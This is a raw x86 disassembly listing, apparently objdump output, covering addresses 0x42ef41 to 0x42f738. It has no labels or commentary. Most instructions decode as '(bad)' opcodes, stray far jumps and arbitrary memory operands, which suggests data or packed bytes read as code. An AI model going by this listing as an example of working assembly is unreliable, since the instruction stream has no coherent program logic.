  42ef41:	cmp    edi,0x28
  42ef44:	xchg   bh,bh
  42ef46:	repz arpl WORD PTR [eax],ax
  42ef49:	dec    DWORD PTR [ecx-0x6effe475]
  42ef4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef50:	add    bh,bh
  42ef52:	inc    DWORD PTR [ebx]
  42ef54:	dec    eax
  42ef55:	add    dh,al
  42ef57:	or     bh,bh
  42ef59:	add    bh,bh
  42ef5b:	call   0xffff:0x12b9ffd1
  42ef62:	sbb    DWORD PTR [esi-0x1e],0xffffff83
  42ef66:	retf   0xff93
  42ef69:	cmp    edi,0x75
  42ef6c:	mov    edx,0xff150e83
  42ef71:	(bad)  
  42ef72:	(bad)  
  42ef73:	jnp    0x42efe5
  42ef75:	call   ebp
  42ef77:	inc    ecx
  42ef78:	int3   
  42ef79:	add    DWORD PTR [ebx-0x2c0066ae],0x2f
  42ef80:	add    BYTE PTR [eax],al
  42ef82:	or     DWORD PTR [ecx],0x19
  42ef85:	add    BYTE PTR [edi-0xd],ch
  42ef88:	add    BYTE PTR [ecx+0x520c00],cl
  42ef8e:	jo     0x42ef21
  42ef90:	cmp    edi,0x0
  42ef93:	pop    ebp
  42ef94:	add    edi,edi
  42ef96:	mov    eax,ds:0xccff8354
  42ef9b:	or     al,0x24
  42ef9d:	add    BYTE PTR [eax],bl
  42ef9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efa0:	add    bh,bh
  42efa2:	add    BYTE PTR [edi-0x4d977c55],cl
  42efa8:	add    BYTE PTR [eax],al
  42efaa:	(bad)  
  42efab:	fstp   QWORD PTR [esi-0x7cde9a00]
  42efb1:	add    DWORD PTR [eax],0xffffffe2
  42efb4:	inc    ebp
  42efb5:	call   DWORD PTR [ebx+0x34]
  42efb8:	(bad)  
  42efb9:	(bad)  
  42efba:	jmp    FWORD PTR [ecx+edi*2-0x7d]
  42efbe:	fwait
  42efbf:	es int3 
  42efc1:	dec    esp
  42efc3:	shr    BYTE PTR [edx-0x331b4201],0xff
  42efca:	call   DWORD PTR [eax+0x31]
  42efcd:	int3   
  42efce:	adc    edi,DWORD PTR [ecx+0x0]
  42efd1:	(bad)  
  42efd2:	push   DWORD PTR [ebx+0x2fb2ff19]
  42efd8:	add    BYTE PTR [eax],al
  42efda:	call   DWORD PTR [ecx]
  42efdc:	xor    al,0xff
  42efde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efdf:	and    eax,0xc6ffff83
  42efe4:	adc    bh,bh
  42efe6:	and    DWORD PTR gs:[eax],eax
  42efe9:	add    bh,bh
  42efeb:	(bad)
  42efee:	test   al,0x3f
  42eff0:	dec    DWORD PTR [ecx+0x39caff]
  42eff6:	lea    eax,[edx-0x3b330001]
  42effc:	jmp    0xffb56884
  42f001:	inc    DWORD PTR [eax]
  42f003:	cmp    dh,dl
  42f005:	add    ch,dl
  42f007:	mov    dl,0x83
  42f009:	inc    DWORD PTR [ebx-0x4b003a1a]
  42f00f:	inc    eax
  42f010:	inc    DWORD PTR [ebx-0x7c3b8500]
  42f016:	sub    dl,BYTE PTR [edx]
  42f018:	inc    DWORD PTR [ebx+0x772100]
  42f01e:	ins    WORD PTR es:[edi],dx
  42f020:	dec    esp
  42f022:	add    BYTE PTR [ebp-0x1c5b7d00],bl
  42f028:	add    ah,cl
  42f02a:	call   DWORD PTR [edx-0x64]
  42f02d:	inc    DWORD PTR [ebx+0x67]
  42f030:	add    bh,bh
  42f032:	or     DWORD PTR [edi],0xffffff9f
  42f035:	dec    DWORD PTR [ebp+0x1e]
  42f038:	int3   
  42f039:	add    bh,bh
  42f03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f03c:	outs   dx,BYTE PTR ds:[esi]
  42f03d:	call   FWORD PTR [ebx+0x1e]
  42f040:	(bad)  
  42f041:	inc    DWORD PTR [ebx-0x6cffe8cf]
  42f047:	jp     0x42f049
  42f049:	int3   
  42f04a:	add    BYTE PTR [ebx],dh
  42f04c:	and    al,BYTE PTR [ebx+0x83396b]
  42f052:	int3   
  42f053:	push   es
  42f054:	mov    esi,0xfffc8bff
  42f059:	int3   
  42f05a:	add    BYTE PTR [esi-0x5d2cff20],bl
  42f060:	int3   
  42f061:	(bad)  
  42f062:	(bad)  
  42f063:	jge    0x42f09e
  42f065:	jmp    FWORD PTR [ebx-0x7e]
  42f068:	add    BYTE PTR [ecx+0x703e89],cl
  42f06e:	jge    0x42f0bf
  42f070:	inc    DWORD PTR [ebx+0x8dfe00]
  42f076:	xor    esi,esi
  42f078:	(bad)  
  42f079:	(bad)  
  42f07a:	dec    edx
  42f07c:	cmc    
  42f07d:	add    BYTE PTR [ecx+ebp*4+0x7cff00ff],al
  42f084:	adc    edi,edi
  42f086:	xor    al,0xa4
  42f088:	add    BYTE PTR [eax],al
  42f08a:	jmp    esi
  42f08c:	jne    0x42f08e
  42f08e:	(bad)  
  42f090:	inc    DWORD PTR [eax]
  42f092:	add    BYTE PTR [ecx],ch
  42f094:	cmp    bh,0x94
  42f097:	je     0x42f065
  42f099:	add    bh,bh
  42f09b:	inc    ecx
  42f09c:	adc    edi,edi
  42f09e:	sbb    DWORD PTR [edx-0x7d],ecx
  42f0a1:	int3   
  42f0a2:	jmp    ecx
  42f0a4:	jmp    0xffff:0xffeaaf83
  42f0ab:	pop    ecx
  42f0ac:	xlat   BYTE PTR ds:[ebx]
  42f0ad:	add    BYTE PTR [ecx-0x7c000002],cl
  42f0b3:	hlt    
  42f0b4:	push   esi
  42f0b5:	sub    DWORD PTR [ecx-0x1e],0xffffffff
  42f0b9:	dec    esp
  42f0bb:	mov    bh,0x4a
  42f0bd:	inc    DWORD PTR [ecx+0x17]
  42f0c0:	inc    DWORD PTR [eax]
  42f0c2:	(bad)  
  42f0c3:	std    
  42f0c4:	jo     0x42f0c5
  42f0c6:	push   edx
  42f0c7:	add    DWORD PTR [ebx-0x4cf20001],eax
  42f0cd:	int3   
  42f0ce:	xor    DWORD PTR [edi+edi*8],ecx
  42f0d1:	inc    DWORD PTR [ebx+0x5f832588]
  42f0d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0d8:	dec    DWORD PTR [ecx-0x81bb01]
  42f0de:	sub    DWORD PTR [eax+0x7100cc00],ebx
  42f0e4:	sar    edi,1
  42f0e6:	sub    al,0xd6
  42f0e8:	(bad)  
  42f0e9:	(bad)  
  42f0ea:	jmp    FWORD PTR [edx-0x3442ffb7]
  42f0f0:	inc    DWORD PTR [eax]
  42f0f2:	mov    DWORD PTR [ecx*8-0x7caeca01],edx
  42f0f9:	dec    DWORD PTR [ecx+0x45ff0433]
  42f0ff:	or     BYTE PTR [eax],al
  42f101:	inc    DWORD PTR [ebx+0x6b8385e9]
  42f107:	pop    edx
  42f108:	mov    edi,edi
  42f10a:	call   DWORD PTR [ebx]
  42f10c:	out    0x83,eax
  42f10e:	sub    ch,ah
  42f110:	dec    DWORD PTR [ecx+0x126700]
  42f116:	(bad)  
  42f117:	push   ss
  42f118:	(bad)  
  42f119:	inc    DWORD PTR [eax]
  42f11b:	pop    eax
  42f11c:	sar    bh,1
  42f11e:	adc    DWORD PTR [esi],eax
  42f120:	add    DWORD PTR [ebx-0x7688df01],0xffffff8d
  42f127:	(bad)  
  42f129:	mov    DWORD PTR [eax],eax
  42f12b:	mov    dl,0xd0
  42f12d:	mov    DWORD PTR [eax-0x14],esi
  42f130:	add    bh,bh
  42f132:	add    bl,dl
  42f134:	add    ah,cl
  42f136:	mov    esp,0xffff54
  42f13b:	fist   DWORD PTR [esi-0x1]
  42f13e:	scas   eax,DWORD PTR es:[edi]
  42f13f:	xchg   ah,cl
  42f141:	dec    esp
  42f143:	cmp    al,BYTE PTR [eax+eax*1-0xff1947]
  42f14a:	mov    DWORD PTR [eax+0x35a5ccfa],ecx
  42f150:	add    bh,bh
  42f152:	call   FWORD PTR [eax-0x48b0338e]
  42f158:	inc    DWORD PTR [ebx+0x129ff]
  42f15e:	scas   eax,DWORD PTR es:[edi]
  42f15f:	repnz inc DWORD PTR [eax]
  42f162:	and    edi,0xffffffbc
  42f165:	jmp    FWORD PTR [eax+0xccba]
  42f16b:	add    DWORD PTR [ebx],esp
  42f16d:	or     DWORD PTR ds:0xff830e,0xfffffff5
  42f174:	nop
  42f175:	inc    DWORD PTR [edi-0x34]
  42f17b:	add    eax,0x9a110048
  42f180:	int3   
  42f181:	(bad)  
  42f182:	(bad)  
  42f183:	mov    ebp,0x44dfff1
  42f188:	mov    edi,edi
  42f18a:	call   FWORD PTR [ebx-0x75]
  42f18d:	mov    DWORD PTR [eax+0x62],edi
  42f190:	inc    DWORD PTR [ebx+0x42bdcc]
  42f196:	cmp    dh,BYTE PTR [ebp-0x1000100]
  42f19c:	push   ebp
  42f19d:	jmp    FWORD PTR [ebp+eiz*8+0x6c000000]
  42f1a4:	mov    ds:0xcc8d7883,eax
  42f1a9:	add    BYTE PTR [eax],al
  42f1ab:	sub    bh,BYTE PTR [ebx-0x483401]
  42f1b1:	add    BYTE PTR [eax],al
  42f1b3:	or     eax,DWORD PTR [eax-0x1]
  42f1b6:	hlt    
  42f1b7:	jns    0x42f13c
  42f1b9:	add    ah,cl
  42f1bb:	or     BYTE PTR [ecx+0x6b3fff],bl
  42f1c1:	add    bh,bh
  42f1c3:	cs cmp edi,edi
  42f1c6:	dec    edi
  42f1c7:	inc    ecx
  42f1c8:	add    bh,bh
  42f1ca:	(bad)  
  42f1cb:	clc    
  42f1cc:	inc    ecx
  42f1cd:	mov    esi,esi
  42f1cf:	cwde   
  42f1d0:	mov    DWORD PTR [eax],eax
  42f1d2:	jmp    DWORD PTR [eax-0x77ef0077]
  42f1d8:	add    DWORD PTR [eax],0xffffffff
  42f1db:	and    eax,0x71870005
  42f1e0:	inc    DWORD PTR [ebx+0x158083]
  42f1e6:	ins    DWORD PTR es:[edi],dx
  42f1e7:	mov    bh,bh
  42f1e9:	dec    esp
  42f1eb:	lock gs (bad) 
  42f1ee:	jmp    0x4815:0xff83ff23
  42f1f5:	jmp    FWORD PTR [edx-0x4d]
  42f1f8:	inc    DWORD PTR [eax]
  42f1fa:	add    BYTE PTR [esi+0x4e],ch
  42f1fd:	inc    DWORD PTR [esi-0x85]
  42f203:	fnstcw WORD PTR [edx+0x0]
  42f206:	cmp    BYTE PTR [edi+edi*8-0x7d],ah
  42f20a:	call   FWORD PTR [edx+0x23]
  42f20d:	push   DWORD PTR [edx+0x57]
  42f210:	add    BYTE PTR [ecx+0x867cff],cl
  42f216:	int3   
  42f217:	pop    ebp
  42f218:	(bad)  
  42f219:	(bad)  
  42f21a:	(bad)  
  42f21b:	in     al,dx
  42f21c:	push   edi
  42f21d:	jmp    FWORD PTR [esi]
  42f21f:	xor    edi,edi
  42f221:	or     esp,0x59
  42f224:	sub    edi,edi
  42f226:	add    eax,0xff81
  42f22b:	cs mov ch,0x83
  42f22e:	les    edx,FWORD PTR [edi-0x1]
  42f231:	(bad)  
  42f232:	inc    ecx
  42f234:	xor    al,0x0
  42f236:	inc    ecx
  42f237:	outs   dx,BYTE PTR ds:[esi]
  42f238:	(bad)  
  42f239:	(bad)  
  42f23a:	(bad)  
  42f23b:	out    dx,eax
  42f23c:	mov    eax,0x729aff
  42f241:	inc    DWORD PTR [ebx+0x77cc93e1]
  42f247:	jp     0x42f248
  42f249:	add    ah,cl
  42f24b:	rcr    dl,0x83
  42f24e:	iret   
  42f24f:	or     edi,edi
  42f251:	add    bh,bh
  42f253:	or     BYTE PTR [eax-0x1],dh
  42f256:	and    eax,0xff65
  42f25b:	test   BYTE PTR [ebx],bh
  42f25d:	jmp    DWORD PTR [ebx-0xffd5]
  42f263:	rol    DWORD PTR ds:0x9c2cff,0xff
  42f26a:	(bad)  
  42f26b:	cmp    DWORD PTR [ebx],ebp
  42f26d:	sub    DWORD PTR [eax],0xffffffdf
  42f270:	(bad)  
  42f271:	inc    DWORD PTR [eax]
  42f273:	xor    ecx,DWORD PTR [edi+0x0]
  42f276:	pop    esp
  42f277:	inc    edx
  42f278:	int3   
  42f279:	add    BYTE PTR [eax],al
  42f27b:	fstp   DWORD PTR [eax-0x7d]
  42f27e:	test   eax,0x89cc51
  42f283:	jecxz  0x42f2e1
  42f285:	jmp    DWORD PTR [edx]
  42f287:	aam    0xff
  42f289:	inc    DWORD PTR [eax]
  42f28b:	jle    0x42f2a4
  42f28d:	jmp    DWORD PTR [edi]
  42f28f:	jae    0x42f290
  42f291:	mov    DWORD PTR [ebx+0x73ff72b0],eax
  42f297:	aam    0x0
  42f299:	mov    DWORD PTR [eax],eax
  42f29b:	je     0x42f2e1
  42f29d:	mov    DWORD PTR [edi-0x76008e],edx
  42f2a3:	jns    0x42f2ee
  42f2a5:	jmp    ecx
  42f2a7:	test   eax,0x4bffffff
  42f2ac:	mov    ch,0x83
  42f2ae:	xor    dh,al
  42f2b0:	add    bh,bh
  42f2b2:	push   DWORD PTR [esi-0x3c877c41]
  42f2b8:	add    bh,bh
  42f2ba:	jmp    FWORD PTR [edx-0x19feff24]
  42f2c0:	add    BYTE PTR [ecx-0xa48b77],cl
  42f2c6:	jns    0x42f347
  42f2c8:	mov    DWORD PTR [eax],eax
  42f2ca:	mov    DWORD PTR [esi+ebp*2-0x768a3a01],ebx
  42f2d1:	add    DWORD PTR [ebx+0x3a006320],0xffffff87
  42f2d8:	mov    DWORD PTR [ebx-0x7664c601],eax
  42f2de:	jbe    0x42f2fc
  42f2e0:	(bad)  
  42f2e1:	(bad)  
  42f2e2:	(bad)  
  42f2e3:	fmul   DWORD PTR [edi-0x1]
  42f2e6:	scas   al,BYTE PTR es:[edi]
  42f2e7:	jbe    0x42f26c
  42f2e9:	(bad)  
  42f2ea:	jmp    DWORD PTR [edx+ebp*8-0x77]
  42f2ee:	gs sar edi,1
  42f2f1:	add    BYTE PTR [eax],al
  42f2f3:	neg    esi
  42f2f5:	push   DWORD PTR ds:0x83892e
  42f2fb:	gs js  0x42f2fe
  42f2fe:	jecxz  0x42f36e
  42f300:	add    bh,bh
  42f302:	call   FWORD PTR [edx]
  42f304:	sbb    edi,edi
  42f306:	sub    BYTE PTR [esi],ch
  42f308:	add    BYTE PTR [ebx-0x68ef00],al
  42f30e:	push   0x8383ff7b
  42f313:	xor    al,0xc7
  42f315:	mov    DWORD PTR [esi-0x15],eax
  42f318:	inc    DWORD PTR [eax]
  42f31a:	inc    DWORD PTR [edi-0x17]
  42f31d:	int3   
  42f31e:	pop    ss
  42f31f:	mov    al,BYTE PTR [eax]
  42f321:	add    bh,bh
  42f323:	add    DWORD PTR [ecx-0x1],ecx
  42f326:	fiadd  WORD PTR [esi-0x1]
  42f329:	int3   
  42f32a:	add    BYTE PTR [edx],al
  42f32c:	outs   dx,BYTE PTR ds:[esi]
  42f32d:	inc    DWORD PTR ds:0xccffe8
  42f333:	jb     0x42f352
  42f335:	push   DWORD PTR [esi]
  42f337:	cmc    
  42f338:	inc    DWORD PTR [eax]
  42f33a:	(bad)  
  42f33b:	in     al,dx
  42f33c:	sti    
  42f33d:	call   DWORD PTR [esi]
  42f33f:	loop   0x42f30d
  42f341:	add    BYTE PTR [eax],al
  42f343:	les    edx,FWORD PTR [ecx-0x7c54a700]
  42f349:	add    bh,bh
  42f34b:	mov    al,0x2b
  42f34d:	jmp    FWORD PTR [edx+0x2e]
  42f350:	inc    DWORD PTR [ebx-0x855701]
  42f356:	rcl    ecx,cl
  42f358:	dec    DWORD PTR [ecx-0x2a2b34]
  42f35e:	imul   esi,eax,0xbbffffff
  42f364:	jle    0x42f365
  42f366:	mov    ecx,0xffffae
  42f36b:	jne    0x42f3e7
  42f36d:	dec    DWORD PTR [ecx-0x13]
  42f370:	int3   
  42f371:	add    DWORD PTR [ebx-0x357cb28b],0x46
  42f378:	(bad)  
  42f379:	inc    DWORD PTR [ebx+0x1fff0dff]
  42f37f:	sbb    edi,edi
  42f381:	mov    DWORD PTR [eax],eax
  42f383:	(bad)  
  42f384:	outs   dx,BYTE PTR ds:[esi]
  42f385:	add    BYTE PTR [edi],dh
  42f387:	xor    al,0xff
  42f389:	inc    DWORD PTR [eax]
  42f38b:	adc    al,bh
  42f38d:	call   DWORD PTR [eax-0x7647]
  42f393:	adc    edx,DWORD PTR [ecx-0x1b1877]
  42f399:	(bad)  
  42f39a:	jmp    DWORD PTR [ebx+0x52118341]
  42f3a0:	cmp    edi,0x0
  42f3a3:	lods   al,BYTE PTR ds:[esi]
  42f3a4:	clc    
  42f3a5:	add    DWORD PTR [eax+0x6a],0xffffff89
  42f3a9:	(bad)  
  42f3aa:	call   FWORD PTR [ecx+edx*2]
  42f3ad:	mov    ebx,edx
  42f3af:	hlt    
  42f3b0:	(bad)  
  42f3b1:	dec    DWORD PTR [ecx-0x4d001353]
  42f3b7:	mov    bh,0xff
  42f3b9:	add    BYTE PTR [eax],al
  42f3bb:	and    BYTE PTR ds:0xfff4a400,ch
  42f3c1:	(bad)  
  42f3c2:	call   FWORD PTR [ecx]
  42f3c4:	test   DWORD PTR [ebx-0x577c],eax
  42f3ca:	int3   
  42f3cb:	mov    esp,0x8ececcab
  42f3d0:	inc    DWORD PTR [eax]
  42f3d2:	mov    DWORD PTR [edx+0x28dfffd6],edx
  42f3d8:	add    BYTE PTR [eax],al
  42f3da:	and    edx,0x6a
  42f3dd:	add    ch,bl
  42f3df:	aas    
  42f3e0:	add    DWORD PTR [eax],0xffffffff
  42f3e3:	call   0xa853f372
  42f3e8:	add    bh,bh
  42f3ea:	add    BYTE PTR [ebp+0x62cc000e],dl
  42f3f0:	inc    DWORD PTR [eax]
  42f3f2:	inc    DWORD PTR [edi+0x63]
  42f3f5:	mov    DWORD PTR [ebx-0x7cff3f],esp
  42f3fb:	push   ds
  42f3fc:	jmp    0x836a3c01
  42f401:	(bad)  
  42f402:	call   FWORD PTR [ecx+0x6220ffc1]
  42f408:	dec    esp
  42f40a:	add    BYTE PTR [esi],bh
  42f40c:	test   al,0xff
  42f40e:	cmc    
  42f40f:	add    ah,cl
  42f411:	add    bh,bh
  42f413:	adc    BYTE PTR ds:0x3051ff,bl
  42f419:	add    BYTE PTR [eax],al
  42f41b:	dec    edx
  42f41c:	cmp    BYTE PTR [eax],al
  42f41e:	ror    cl,0xff
  42f421:	add    bh,bh
  42f423:	add    ah,dl
  42f425:	mov    DWORD PTR [edx],ebp
  42f427:	sbb    al,0x0
  42f429:	int3   
  42f42a:	add    BYTE PTR [ebp-0x55d6ff45],ch
  42f430:	add    DWORD PTR [eax],0xffffffcc
  42f433:	add    ch,bl
  42f435:	call   FWORD PTR [esi+0xffff65]
  42f43b:	xor    ah,0x83
  42f43e:	mov    ebp,0xfffffffc
  42f443:	mov    DWORD PTR [ebp-0x1],esp
  42f446:	les    esp,FWORD PTR [ebx-0x417cff34]
  42f44c:	sub    eax,DWORD PTR [eax]
  42f44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f44f:	push   ebp
  42f450:	dec    esp
  42f452:	add    BYTE PTR [esi],ch
  42f454:	je     0x42f455
  42f456:	(bad)
  42f459:	add    DWORD PTR [eax],0xd
  42f45c:	xor    DWORD PTR [ebx-0x7cff07db],eax
  42f462:	add    esi,0xffffff94
  42f465:	push   esi
  42f467:	popa   
  42f468:	cmp    edi,0xffffff83
  42f46b:	xchg   edi,eax
  42f46c:	pop    ecx
  42f46d:	cmp    edx,0xffffff84
  42f470:	add    bh,bh
  42f472:	dec    DWORD PTR [esp+eax*2+0x7ee2ff]
  42f479:	add    BYTE PTR [ebx+0xb0053af],al
  42f47f:	dec    ebx
  42f480:	add    BYTE PTR [eax],al
  42f482:	jmp    FWORD PTR [ebx]
  42f484:	cmp    esp,ecx
  42f486:	es int3 
  42f488:	add    bh,bh
  42f48a:	dec    DWORD PTR [ebx-0x7241ff45]
  42f490:	add    DWORD PTR [eax],0xffffffff
  42f493:	mov    ds:0xa1adcc8c,eax
  42f498:	add    ah,cl
  42f49a:	add    BYTE PTR [ecx+0x294b0056],cl
  42f4a0:	add    bh,bh
  42f4a2:	add    BYTE PTR [eax+esi*2],ch
  42f4a5:	sub    DWORD PTR [ebp-0x40],0xffffff83
  42f4a9:	inc    DWORD PTR [eax]
  42f4ab:	(bad)  
  42f4ad:	(bad)  
  42f4ae:	cld    
  42f4af:	xchg   ebx,eax
  42f4b0:	add    bh,bh
  42f4b2:	(bad)  
  42f4b3:	sti    
  42f4b4:	fadd   DWORD PTR [eax]
  42f4b6:	aad    0xe2
  42f4b8:	mov    edi,edi
  42f4ba:	add    BYTE PTR [ebp-0x209f0038],dh
  42f4c0:	cmp    edi,0x0
  42f4c3:	jno    0x42f4e2
  42f4c5:	jmp    DWORD PTR [ecx+0x5b]
  42f4c8:	add    bh,bh
  42f4ca:	mov    DWORD PTR [esi],edx
  42f4cc:	verr   WORD PTR [ecx+0xb]
  42f4d0:	cmp    edi,0xffffffff
  42f4d3:	xchg   BYTE PTR [eax+eax*1+0x894a79],al
  42f4da:	int3   
  42f4db:	idiv   DWORD PTR [esi-0x62234]
  42f4e1:	inc    DWORD PTR [eax]
  42f4e3:	jmp    0xffff:0x41ea0037
  42f4ea:	dec    DWORD PTR [ecx+0x26198959]
  42f4f0:	int3   
  42f4f1:	inc    DWORD PTR [eax]
  42f4f3:	stos   BYTE PTR es:[edi],al
  42f4f4:	add    BYTE PTR [ebx+0xff3a3b],0xff
  42f4fb:	jns    0x42f535
  42f4fd:	or     DWORD PTR [ebp+0xff8388],0x2c
  42f504:	loop   0x42f506
  42f506:	fistp  QWORD PTR [ecx-0x29000000]
  42f50c:	adc    edi,edi
  42f50e:	or     eax,0xffef
  42f513:	ret    0x898a
  42f516:	imul   ebp,DWORD PTR [edi+edi*8],0xffffffff
  42f51a:	add    BYTE PTR [edx-0x79],al
  42f51d:	and    ebx,0x47
  42f520:	cmp    edi,0xffffffff
  42f523:	mov    DWORD PTR [eax+eax*1-0xff9e8c],esi
  42f52a:	add    BYTE PTR [edx-0x2e],bh
  42f52d:	add    BYTE PTR [ebx+0x62],al
  42f530:	cmp    edi,0xffffffff
  42f533:	dec    ebp
  42f534:	ja     0x42f535
  42f536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f537:	(bad)  
  42f539:	add    ah,cl
  42f53b:	jmp    0xb840f477
  42f540:	(bad)  
  42f541:	inc    DWORD PTR [eax]
  42f543:	inc    esp
  42f544:	dec    edi
  42f545:	jmp    DWORD PTR [ebx+0xff47]
  42f54b:	adc    ecx,edi
  42f54d:	mov    DWORD PTR [esp+edi*4-0x1],esp
  42f551:	int3   
  42f552:	add    BYTE PTR [edi+0xb8fffdf],ch
  42f558:	add    BYTE PTR [eax],al
  42f55a:	add    BYTE PTR ds:0xefdeff0d,ah
  42f560:	inc    DWORD PTR [ebx+0xe527ff]
  42f566:	rol    dh,1
  42f568:	(bad)  
  42f569:	(bad)  
  42f56a:	push   DWORD PTR [edi]
  42f56c:	imul   eax,DWORD PTR [ebx-0x7c7cb8f3],0xffffff83
  42f573:	or     eax,0xcad4ff00
  42f578:	dec    esp
  42f57a:	and    DWORD PTR [ecx],0x6e
  42f57d:	add    bh,cl
  42f57f:	add    edi,edi
  42f581:	add    bh,bh
  42f583:	cdq    
  42f584:	and    DWORD PTR [si-0x37],0x0
  42f589:	(bad)  
  42f58a:	call   FWORD PTR [ecx-0xe9800e5]
  42f590:	inc    DWORD PTR [ebx+0x3ef00]
  42f596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f597:	mov    al,0xcc
  42f599:	add    bh,bh
  42f59b:	push   0x1e8e0021
  42f5a0:	mov    DWORD PTR [eax],eax
  42f5a2:	sbb    DWORD PTR [ecx+0x2a],0xffffffcc
  42f5a6:	sbb    ecx,DWORD PTR [esi]
  42f5a8:	cmp    edi,0xffffffff
  42f5ab:	lds    ebx,FWORD PTR [edi+edi*8-0x7cff882a]
  42f5b2:	push   DWORD PTR [edx-0x3b]
  42f5b5:	push   DWORD PTR [eax]
  42f5b7:	mov    ebx,0x66008300
  42f5bc:	add    BYTE PTR ss:[ebx],ah
  42f5bf:	mov    bl,0x0
  42f5c1:	inc    DWORD PTR [eax]
  42f5c3:	clc    
  42f5c4:	mov    al,ds:0xff4880ff
  42f5c9:	inc    DWORD PTR [eax]
  42f5cb:	or     esi,DWORD PTR [edi]
  42f5cd:	add    BYTE PTR [edx+0x5b],ah
  42f5d0:	(bad)  
  42f5d1:	(bad)  
  42f5d2:	call   FWORD PTR [eax]
  42f5d4:	fcos   
  42f5d6:	(bad)  
  42f5d7:	in     eax,dx
  42f5d8:	add    bh,bh
  42f5da:	dec    eax
  42f5dc:	sar    edi,cl
  42f5de:	cmp    cl,BYTE PTR [ecx-0x34]
  42f5e1:	dec    DWORD PTR [ecx-0x6f7c5d78]
  42f5e7:	jp     0x42f56c
  42f5e9:	mov    edi,edi
  42f5eb:	jmp    0xffcc:0xab30cc5d
  42f5f2:	dec    DWORD PTR [esi-0x46]
  42f5f5:	xor    DWORD PTR [esi+0x7e],0xffffffcc
  42f5f9:	(bad)  
  42f5fa:	push   edx
  42f5fc:	scas   eax,DWORD PTR es:[edi]
  42f5fd:	int3   
  42f5fe:	and    esp,edi
  42f600:	(bad)  
  42f601:	(bad)  
  42f602:	call   DWORD PTR [ebp+0x5f0083bd]
  42f608:	add    DWORD PTR [eax],0xffffffcc
  42f60b:	ret    
  42f60c:	call   0x83:0x89ac02ff
  42f613:	add    ebx,ebp
  42f615:	(bad)  
  42f616:	jmp    0x4e33:0xffccff0c
  42f61d:	call   DWORD PTR [ebp-0x7c7c00bd]
  42f623:	gs xchg ecx,eax
  42f625:	dec    DWORD PTR [ecx]
  42f627:	dec    ah
  42f629:	add    bh,bh
  42f62b:	repz retf 0x2f00
  42f62f:	pop    DWORD PTR [ebx+0x3cae0000]
  42f635:	jmp    FWORD PTR [ebp+0xffc6]
  42f63b:	and    al,BYTE PTR ds:0xff4fe8ff
  42f641:	(bad)  
  42f642:	push   ecx
  42f644:	test   edi,edi
  42f646:	pop    esp
  42f647:	push   esi
  42f648:	add    BYTE PTR [ecx+0xdb0383],cl
  42f64e:	jns    0x42f698
  42f650:	add    ah,cl
  42f652:	push   esp
  42f654:	or     al,0xcc
  42f656:	xor    eax,DWORD PTR [eax]
  42f658:	dec    esp
  42f65a:	sbb    DWORD PTR [edi+0x6],0xffffffff
  42f65e:	shl    DWORD PTR [esi-0x1],1
  42f661:	inc    DWORD PTR [ebx-0x60ff960a]
  42f667:	mov    al,0xcc
  42f669:	(bad)  
  42f66a:	(bad)  
  42f66b:	cmp    al,0xd1
  42f66d:	inc    esp
  42f66f:	jns    0x42f671
  42f671:	add    bh,bh
  42f673:	xchg   ebx,eax
  42f674:	sbb    bh,bh
  42f676:	sub    ch,BYTE PTR [edi]
  42f678:	add    bh,bh
  42f67a:	add    BYTE PTR [edx],al
  42f67c:	fwait
  42f67d:	add    BYTE PTR [eax],cl
  42f67f:	jg     0x42f680
  42f681:	mov    DWORD PTR [ebx-0xf006c00],eax
  42f687:	add    BYTE PTR gs:[ebx-0x33ed1a01],al
  42f68e:	mov    ebx,0x24
  42f693:	into   
  42f694:	sbb    al,BYTE PTR [eax]
  42f696:	xchg   esi,eax
  42f697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f698:	add    bh,bh
  42f69a:	jmp    FWORD PTR [ecx]
  42f69c:	dec    eax
  42f69d:	add    BYTE PTR [edi*1-0x15000001],al
  42f6a4:	aam    0xff
  42f6a6:	ret    0xc0
  42f6a9:	(bad)  
  42f6aa:	(bad)  
  42f6ab:	fsub   st(5),st
  42f6ad:	or     DWORD PTR [ebp-0x7cffffb0],0x34
  42f6b4:	es (bad) 
  42f6b6:	sti    
  42f6b7:	outs   dx,BYTE PTR ds:[esi]
  42f6b8:	add    bh,bh
  42f6ba:	int3   
  42f6bb:	xchg   ebp,eax
  42f6bc:	cmp    bh,bh
  42f6be:	adc    BYTE PTR fs:[ebx-0x19e0034],al
  42f6c5:	jmp    DWORD PTR [eax-0xff84]
  42f6cb:	xor    ecx,DWORD PTR [ebx+eax*4-0x69]
  42f6cf:	push   ebx
  42f6d0:	mov    edi,edi
  42f6d2:	int3   
  42f6d3:	in     al,0x7a
  42f6d5:	jmp    FWORD PTR [esi+0x5b]
  42f6d8:	mov    edi,edi
  42f6da:	(bad)  
  42f6db:	jl     0x42f66e
  42f6dd:	int3   
  42f6de:	(bad)  
  42f6df:	mov    edx,0xc5ff0000
  42f6e4:	inc    esp
  42f6e5:	add    BYTE PTR [ebp+esi*2-0x43007c01],ah
  42f6ec:	sub    eax,0xbe400
  42f6f1:	mov    edi,edi
  42f6f3:	mov    edx,0xe06aff4b
  42f6f8:	inc    DWORD PTR [eax]
  42f6fa:	jmp    FWORD PTR [esi+0xd]
  42f6fd:	push   DWORD PTR [eax+eax*4]
  42f700:	(bad)  
  42f701:	inc    DWORD PTR [eax]
  42f703:	loope  0x42f6a4
  42f705:	add    BYTE PTR [eax],bh
  42f707:	sbb    ah,cl
  42f709:	inc    DWORD PTR [ebx+0x6acc3b44]
  42f70f:	push   ecx
  42f710:	dec    esp
  42f712:	add    ch,al
  42f714:	jecxz  0x42f715
  42f716:	pop    ss
  42f717:	cmp    edi,edi
  42f719:	(bad)  
  42f71a:	push   DWORD PTR [edi+eax*1-0x7b1800]
  42f721:	add    bh,bh
  42f723:	and    BYTE PTR [ebp+0x0],dh
  42f726:	xchg   edx,eax
  42f727:	mov    al,ds:0x6200ffff
  42f72c:	add    BYTE PTR [eax],0xfb
  42f72f:	(bad)  
  42f731:	dec    esp
  42f733:	icebp  
  42f734:	cs add esp,0xffffffca
  42f738:	mov    esp,ecx
